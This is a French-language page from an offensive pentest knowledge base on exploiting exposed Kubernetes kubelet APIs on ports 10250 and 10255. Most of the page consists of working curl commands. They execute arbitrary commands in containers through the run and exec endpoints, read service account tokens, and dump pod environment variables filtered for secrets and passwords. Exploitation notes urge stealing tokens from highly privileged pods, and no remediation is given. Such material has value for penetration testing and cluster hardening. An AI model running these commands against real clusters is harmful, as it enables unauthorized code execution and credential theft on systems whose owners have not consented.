---
title: "API kubelet : contrôle du nœud via l'agent présent sur chaque worker"
order: 1
description: "Le kubelet de chaque nœud expose une API HTTPS sur 10250 et souvent une API HTTP en lecture seule sur 10255. Là où l'API en lecture-écriture autorise un accès anonyme ou non autorisé, elle liste les pods et exécute des commandes dans n'importe quel conteneur du nœud ; le port en lecture seule fait fuiter les specs de pods et les secrets d'environnement. L'un comme l'autre transforment l'accès à un nœud en exécution de code dans les conteneurs et en vol de secrets."
keywords:
  - kubelet
  - port 10250
  - port 10255
  - run exec
  - anonymous kubelet
---

# API kubelet

Chaque nœud exécute un kubelet qui expose une API : un endpoint HTTPS authentifié sur 10250 et, sur certains clusters, un endpoint HTTP en lecture seule sur 10255. L'API en lecture-écriture peut lister les pods et exécuter des commandes dans n'importe quel conteneur du nœud, de sorte que si elle autorise un accès anonyme (`--anonymous-auth=true` avec l'autorisation réglée sur `AlwaysAllow`, une mauvaise configuration classique), l'atteindre équivaut à une exécution de code dans chaque pod de ce nœud. Le port en lecture seule n'authentifie jamais et fait fuiter les spécifications complètes des pods, y compris les variables d'environnement qui portent des secrets.

Sonder les deux ports :

```bash
# read-write API: a pods list without a client cert => anonymous access
curl -sk https://<node>:10250/pods | head
# read-only API: always unauthenticated where enabled
curl -s http://<node>:10255/pods | python3 -m json.tool | head -40
```

## Exécuter dans un conteneur

Là où l'API en lecture-écriture est ouverte, l'endpoint `run` exécute une commande dans un pod/namespace/conteneur nommé :

```bash
# enumerate pod, namespace, and container names from /pods, then:
curl -sk -XPOST "https://<node>:10250/run/<namespace>/<pod>/<container>" -d "cmd=id"
curl -sk -XPOST "https://<node>:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# exec endpoint (streamed) for interactive use
curl -sk "https://<node>:10250/exec/<ns>/<pod>/<container>?command=sh&input=1&output=1&tty=1"
```

Exécuter dans un pod livre le jeton de compte de service de ce pod et ses secrets montés ; choisir un pod doté d'un compte de service à forts privilèges permet une escalade immédiate.

## Fuite de secrets en lecture seule

```bash
# the read-only /pods dump contains env vars with injected secrets
curl -s http://<node>:10255/pods | \
  python3 -c 'import sys,json;[print(c.get("env")) for p in json.load(sys.stdin)["items"] for c in p["spec"]["containers"]]' \
  | grep -iE 'token|secret|password|key'
```

## Notes d'exploitation

- L'API en lecture-écriture sans autorisation équivaut à une exécution de code à l'échelle du nœud : vous pouvez faire `run` dans chaque pod du nœud, ciblez donc un pod dont le compte de service dispose d'un RBAC étendu et dérobez son jeton.
- Le port en lecture seule 10255 ne nécessite aucune authentification là où il est activé ; c'est de la pure divulgation, mais il expose régulièrement des identifiants dans les variables d'environnement des pods.
- Atteindre le kubelet se fait souvent via le [proxy de l'API server](api-server-proxy.md) (`nodes/proxy`) plutôt que directement, ce qui contourne l'isolation réseau jusqu'au nœud.
- `/runningpods/` et `/pods` énumèrent les noms exacts nécessaires pour les chemins `run`/`exec`.

## Outils

- [kubeletctl](https://github.com/cyberark/kubeletctl)

## Références

- [Kubernetes : authn/authz du kubelet](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
- [HackTricks : 10250 kubelet](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod)
